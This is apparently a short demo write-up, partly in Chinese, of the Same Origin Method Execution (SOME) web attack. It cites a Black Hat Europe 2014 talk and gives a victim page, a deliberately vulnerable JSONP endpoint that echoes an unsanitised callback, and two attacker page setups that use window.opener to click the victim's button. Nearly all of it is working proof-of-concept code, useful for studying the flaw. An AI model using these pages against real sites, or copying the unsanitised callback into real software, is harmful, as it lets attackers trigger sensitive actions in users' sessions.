### About SOME

Black Hat Eorope 2014 Speech topic.https://www.youtube.com/watch?v=OvarkOxxdic

### Demo1

Secret.html

```html
<html>
    <form action="#">
        <button onclick="getscret()">
            clickkkkkkkkk meeeeeee!!!
        </button>

    </form>

    <script>
        function getscret(){
            alert(document.domain);
        }


        
    </script>


</html>
```

一个jsonp点

```php
<?php
$callback=$_GET['callback'];
echo "<script>";
echo $callback."()";
echo "</script>";
```

some1.html

```html
<script>
    function attack1() {
        window.open("some2.html");
        location.replace("http://b.com/secret.html");
    }

    setTimeout(attack1(), 1000);
</script>
```

some2.html

```javascript
<script>
    function attack() {
        location.replace("http://b.com/jsonp.php?callback=window.opener.document.body.firstElementChild.firstElementChild.click");
    }

    setTimeout(attack, 2000);

</script>
```

#### 效果

打开some1.html->弹窗->当前用户对secret.html页面进行点击敏感点击操作

### Demo2

```html
<iframe src="http://b.com/secret.html" name=b></iframe>
<iframe name=a></iframe>

<script>
window.frames[0].open('http://www.test.com','a');
setTimeout(
  function(){
    window.frames[1].location.href = 'http://b.com/jsonp.php?callback=window.opener.document.body.firstElementChild.firstElementChild.click()'
  }
,1000);
</script>
```

